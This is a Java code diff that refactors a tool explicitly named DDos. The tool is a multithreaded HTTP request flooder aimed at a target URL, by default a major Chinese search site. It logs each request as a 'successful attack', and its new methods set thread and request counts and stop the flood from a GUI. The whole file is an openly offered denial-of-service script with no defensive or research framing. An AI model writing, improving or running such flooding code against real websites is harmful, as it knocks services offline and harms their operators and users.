@@ -8,69 +8,89 @@ import java.net.URLConnection;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-public class DDos {
-    public DDos() {
-    }
-	public static int count = 0;
-    
-    public static void main(String[] args){
-        ExecutorService es = Executors.newFixedThreadPool(1000);
-        Mythread mythread = new Mythread("");
-        Thread thread = new Thread(mythread);
-        for(int i = 0;i<100;i++) {
-            es.execute(thread);
-        }
-    }
-}
+import net.itanken.ddos.utils.StrUtils;
 
-class Mythread implements Runnable {
-	private static String urlStr = "https://www.baidu.com/";
-	public Mythread(String url) {
-		if(!Utils.isEmptyStr(url)) {
-			urlStr = url;
+public class DDos {
+
+	public DDos() {}
+	public static int count = 0; // 总次数
+	public static void main(String[] args) throws InterruptedException {
+		new DDos().doDDos(5, 2);
+	}
+	
+	private ExecutorService es = null;
+	/**
+	 * @param tCount 线程数
+	 * @param sCount 单线程请求数
+	 * @throws InterruptedException
+	 */
+	public boolean doDDos(int tCount, int sCount) throws InterruptedException {
+		es = Executors.newFixedThreadPool(tCount);
+
+		Dthread dThread = new Dthread("", sCount);
+		Thread thread = new Thread(dThread);
+		for (int i = 0; i < tCount; i++) {
+			es.execute(thread);
+		}
+		es.shutdown();
+		while(true) {
+			if(es.isTerminated()) {
+				DDosFrame.jtaInfo.append("执行完毕！" + count);
+				return true;
+			}
+			Thread.sleep(2000);
 		}
 	}
 	
-    public void run() {
-        while(DDos.count < 100){
-            try {
-    			DDos.count++;
-                URL url = new URL(urlStr);
-                URLConnection conn = url.openConnection();
-                System.out.println(DDos.count + " - 发包成功：" + url);
-                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
-                byte[] bytes = new byte[1024];
-                int len = -1;
-                StringBuffer sb = new StringBuffer();
-                if(bis != null){
-                    if((len = bis.read()) != -1){
-                        sb.append(new String (bytes,0,len));
-                        System.out.println("攻击成功！" + sb.toString());
-                        bis.close();
-                    }
-                }                    
-            } catch (MalformedURLException e) {
-                e.printStackTrace();
-            } catch (IOException e) {
-            	System.out.println(e.getMessage());
-                e.printStackTrace();
-                if(e.getMessage().contains("Server returned HTTP response code")) {
-                    System.out.println("请检查网站！");
-                }
-            }
-            
-        }
-    }
+	public boolean stopDDos() {
+		if(es != null) {
+			es.shutdownNow();
+			return true;
+		}
+		return false;
+	}
 }
 
-class Utils {
-	
+class Dthread implements Runnable {
+	private static String urlStr = "https://www.baidu.com/";
+	private static int count = 1000;
+
 	/**
-	 * 检查字符串是否为空： null/"null"/""
-	 * @param str
-	 * @return boolean
+	 * @param url 请求地址
+	 * @param sCount 单线程请求数
 	 */
-	public final static boolean isEmptyStr(String str) {
-		return ((str == null || str.trim().equalsIgnoreCase("null") || str.trim().equals("")) ? true : false);
+	public Dthread(String url, int sCount) {
+		if (!StrUtils.isEmpty(url)) {
+			urlStr = url;
+		}
+		count = sCount;
+	}
+
+	public void run() {
+		while (count == 0 || DDos.count < count) {
+			try {
+				DDos.count++;
+				int curCount = DDos.count;
+				URL url = new URL(urlStr);
+				URLConnection conn = url.openConnection();
+				DDosFrame.jtaInfo.append(" 第 " + curCount + " 次发包成功。");
+				BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
+				byte[] bytes = new byte[1024];
+				int len = -1;
+				StringBuffer sb = new StringBuffer();
+				if (bis != null && (len = bis.read()) != -1) {
+					sb.append(new String(bytes, 0, len));
+					DDosFrame.jtaInfo.append(" 第 " + curCount + " 次攻击成功！");
+					bis.close();
+				}
+			} catch (MalformedURLException e) {
+				DDosFrame.console.showError(e);
+			} catch (IOException e) {
+				DDosFrame.console.showError(e);
+				if (e.getMessage().contains("Server returned HTTP response code")) {
+					DDosFrame.jtaInfo.append("请检查网站！");
+				}
+			}
+		}
 	}
 }
